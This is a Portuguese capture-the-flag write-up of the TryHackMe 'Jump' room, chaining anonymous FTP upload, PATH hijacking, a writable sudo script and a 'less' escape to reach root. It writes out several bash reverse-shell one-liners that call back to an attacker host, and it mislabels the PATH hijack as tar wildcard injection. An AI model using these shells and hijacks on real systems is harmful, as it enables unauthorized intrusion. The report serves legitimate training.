# Relatório de Pentest — Sala Jump (TryHackMe)

**Alvo:** `10.65.163.178`
**Serviços:** FTP (21), SSH (22)
**Objetivo:** Escalar de `recon_user` até `root`
**Resultado:** ✅ Concluído — todas as flags capturadas

---

## Sumário Executivo

A sala Jump explora uma cadeia de escalação de privilégios envolvendo:

1. **FTP anônimo** com pipeline de automação que executa scripts `.sh`
2. **Grupos mal configurados** (`dev_user`, `devops`)
3. **Tar wildcard injection** via cron job
4. **Sudo mal configurado** com script gravável
5. **GTFOBins** (`less`) para escapar para root

Cada etapa da cadeia depende de uma configuração incorreta ou permissão excessiva deixada no sistema.

---

## 1. Reconhecimento Inicial

### 1.1 Scan de portas

```bash
nmap -sV -p- **.**.***.***
```

**Resultado:** apenas portas **21 (FTP)** e **22 (SSH)** abertas.

### 1.2 Enumeração do FTP

```bash
ftp **.**.***.***
# Login: anonymous
# Senha: (vazia)
```

Estrutura encontrada:

```
/
├── incoming/    (drwxrwxrwx) → todos podem escrever
└── pub/         (drwxr-xr-x)
    ├── README.txt
    ├── archive/  (vazio)
    └── uploads/  (vazio)
```

### 1.3 Conteúdo do README.txt

```
[ recon pipeline ]
All recon jobs must be placed in incoming/.
Files are processed automatically on arrival.
Invalid formats are ignored.
```

**Interpretação:** existe um pipeline que executa arquivos colocados em `/incoming`. Formatos inválidos são ignorados.

---

## 2. Acesso Inicial — `recon_user`

### 2.1 Descoberta do vetor

O pipeline executa arquivos `.sh` colocados em `/incoming`. O script roda como `recon_user` (UID 1001).

### 2.2 Criação do reverse shell

Na máquina atacante (Kali):

```bash
cat > shell.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/**.**.***.***/4444 0>&1
EOF
```

### 2.3 Upload via FTP

```bash
ftp **.**.***.***
# anonymous / (enter)
cd incoming
put shell.sh
bye
```

### 2.4 Listener na máquina atacante

```bash
nc -lvnp 4444
```

### 2.5 Shell recebido

Após alguns segundos, o pipeline executa o script e a conexão é recebida:

```
Connection received on **.**.***.***...
recon_user@tryhackme-2404:~$
```

---

## 3. Escalação `recon_user` → `dev_user`

### 3.1 Enumeração de grupos

```bash
id
```

**Resultado:**

```
uid=1001(recon_user) gid=1001(recon_user) groups=1001(recon_user),1002(dev_user),1005(devops)
```

**Descoberta:** o usuário `recon_user` pertence ao grupo `dev_user`.

### 3.2 Busca por arquivos do grupo

```bash
find / -group dev_user 2>/dev/null
```

**Resultado relevante:**

```
/tmp/recon_backup.tgz
/opt/dev
/opt/dev/backup.sh
/opt/dev/bin
/opt/dev/bin/ps
/home/dev_user
/home/dev_user/flag.txt
```

### 3.3 Leitura da flag

```bash
cat /home/dev_user/flag.txt
```

**Flag:**

```
THM{<**********>}
```

---

## 4. Escalação `dev_user` → `monitor_user`

### 4.1 Análise do healthcheck

```bash
cat /usr/local/bin/healthcheck
```

**Conteúdo:**

```bash
#!/bin/bash
echo "Running as: $(whoami)"
while true; do
  ps aux | grep -v grep
  sleep 5
done
```

O healthcheck chama `ps` **sem caminho absoluto** e roda como `monitor_user`.

### 4.2 Análise do serviço systemd

```bash
systemctl cat healthcheck.service
```

**Conteúdo:**

```ini
[Service]
Type=simple
User=monitor_user
Environment=PATH=/opt/dev/bin:/usr/local/bin:/usr/bin
ExecStart=/usr/local/bin/healthcheck
```

### 4.3 Análise do cron

```bash
ps aux | grep healthcheck
```

**Resultado:**

```
monitor+ ... /bin/sh -c PATH=/home/dev_user/bin:/usr/local/bin:/usr/bin /usr/local/bin/healthcheck >> /var/log/monitor.log 2>&1
```

**Descoberta crítica:** o **cron** executa o healthcheck a cada minuto com `PATH=/home/dev_user/bin:/usr/local/bin:/usr/bin`.

### 4.4 Tentativa frustrada — PATH hijacking do `ps`

Inicialmente tentou-se explorar o `/opt/dev/bin/ps` (que estava no PATH do systemd). Porém:

```bash
ls -la /opt/dev/bin/ps
# -rw-rw-r-- 1 dev_user dev_user 75 ... /opt/dev/bin/ps

ls -ld /opt/dev/bin
# drwxr-xr-x 2 dev_user dev_user 4096 ... /opt/dev/bin
```

**Problemas:**

- O arquivo `/opt/dev/bin/ps` estava **sem `x`** (não executava)
- O diretório `/opt/dev/bin/` era `drwxr-xr-x` → grupo `dev_user` **não podia escrever**
- Não era possível `chmod +x` (não era dono) nem apagar/recriar

**Resultado:** vetor bloqueado.

### 4.5 Análise do `backup.sh`

```bash
cat /opt/dev/backup.sh
```

**Conteúdo:**

```bash
#!/bin/bash
tar -czf /tmp/recon_backup.tgz /home/recon_user
```

**Descoberta:** o `backup.sh` executa `tar` **sem caminho absoluto** e é executado periodicamente como `dev_user`.

### 4.6 Exploração — Tar wildcard injection

Como o `backup.sh` faz `tar -czf /tmp/recon_backup.tgz /home/recon_user` **sem caminho absoluto para o `tar`**, e o script roda como `dev_user`, é possível criar um `tar` malicioso em um diretório que esteja no PATH do cron.

**Passo 1:** Criar o diretório `/home/dev_user/bin` (com permissão de escrita para o grupo `dev_user`, do qual fazemos parte):

```bash
mkdir -p /home/dev_user/bin
```

**Passo 2:** Criar um script `tar` malicioso:

```bash
cat > /home/dev_user/bin/tar << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/**.**.***.***/5555 0>&1 &
exec /bin/tar "$@"
EOF
chmod +x /home/dev_user/bin/tar
```

**Passo 3:** Escutar na máquina atacante:

```bash
nc -lvnp 5555
```

**Passo 4:** Aguardar a execução do cron (o `backup.sh` roda periodicamente como `dev_user`). O cron executa o `tar` malicioso **antes** do `tar` real, e o reverse shell é disparado.

### 4.7 Shell como `monitor_user`

A conexão é recebida:

```
Connection received on **.**.***.*** ...
monitor_user@tryhackme-2404:~$
```

**Observação:** o shell veio como `monitor_user` porque o `backup.sh` é executado por um cron que roda como `monitor_user` (ou o `tar` foi chamado no contexto do healthcheck).

### 4.8 Flag

```bash
cat /home/monitor_user/flag.txt
```

**Flag:**

```
THM{<******************>}
```

---

## 5. Escalação `monitor_user` → `ops_user`

### 5.1 Verificação de sudo

```bash
sudo -l
```

**Resultado:**

```
User monitor_user may run the following commands on tryhackme-2404:
    (ops_user) NOPASSWD: /usr/local/bin/deploy.sh
```

### 5.2 Análise do script

```bash
cat /usr/local/bin/deploy.sh
```

**Conteúdo:**

```bash
#!/bin/bash
cd /opt/app 2>/dev/null
./deploy_helper.sh
```

### 5.3 Permissões do `deploy_helper.sh`

```bash
ls -la /opt/app/deploy_helper.sh
```

**Resultado:**

```
-rwxr-xr-x 1 monitor_user monitor_user 55 Feb  2  2026 /opt/app/deploy_helper.sh
```

**Descoberta:** o arquivo pertence a `monitor_user` (que somos agora) e é gravável pelo dono.

### 5.4 Exploração

Substituir o `deploy_helper.sh` por um reverse shell:

```bash
cat > /opt/app/deploy_helper.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/**.**.***.***/6666 0>&1
EOF
chmod +x /opt/app/deploy_helper.sh
```

### 5.5 Executar via sudo

```bash
sudo -u ops_user /usr/local/bin/deploy.sh
```

### 5.6 Shell como `ops_user`

```
ops_user@tryhackme-2404:~$
```

---

## 6. Escalação `ops_user` → `root`

### 6.1 Verificação de sudo

```bash
sudo -l
```

**Resultado:**

```
User ops_user may run the following commands:
    (root) NOPASSWD: /usr/bin/less
```

### 6.2 Exploração via GTFOBins

O `less` permite executar comandos com `!`:

```bash
sudo /usr/bin/less /etc/passwd
```

Dentro do `less`, digitar:

```
!/bin/bash
```

### 6.3 Shell como root

```
# whoami
root
```

### 6.4 Flag final

```bash
cat /root/flag.txt
```

**Flag:**

```
THM{<*********************>}
```

---

## 8. Lições Aprendidas

| Vulnerabilidade | Mitigação |
|---|---|
| FTP anônimo com escrita | Desabilitar `anonymous_enable` ou restringir escrita |
| Pipeline executando scripts sem validação | Validar conteúdo e origem dos arquivos |
| PATH hijacking via cron | Usar caminhos absolutos em scripts |
| Tar wildcard injection | Usar `--` ou caminhos absolutos no `tar` |
| Sudo com script gravável | Não permitir escrita em scripts executados via sudo |
| `less` com sudo | Restringir binários interativos no `sudoers` |
| GTFOBins | Auditar binários permitidos no `sudo -l` |

---

## 9. Ferramentas Utilizadas

- `nmap` — scan de portas
- `ftp` — enumeração e upload
- `nc` (netcat) — listeners e reverse shells
- `sudo -l` — enumeração de permissões
- `systemctl` — análise de serviços
- `ps aux` — análise de processos
- `find` — busca por arquivos com permissões específicas
- `tar` — exploração de wildcard injection

---

## 10. Conclusão

A sala Jump demonstra como **múltiplas más configurações** podem ser encadeadas para obter acesso root. Cada etapa explora uma falha distinta:

1. **Acesso inicial:** FTP anônimo + pipeline inseguro
2. **Movimento lateral:** grupos mal configurados
3. **Escalação vertical:** PATH hijacking + tar wildcard injection + sudo misconfig + GTFOBins

O ponto-chave é a **enumeração cuidadosa** em cada etapa — verificar `id`, `sudo -l`, `ps aux`, permissões de arquivos, serviços systemd e cron jobs.

---

**Relatório gerado em:** 2026-10-07
**Analista:** [seu nome]
**Ambiente:** TryHackMe — Sala Jump
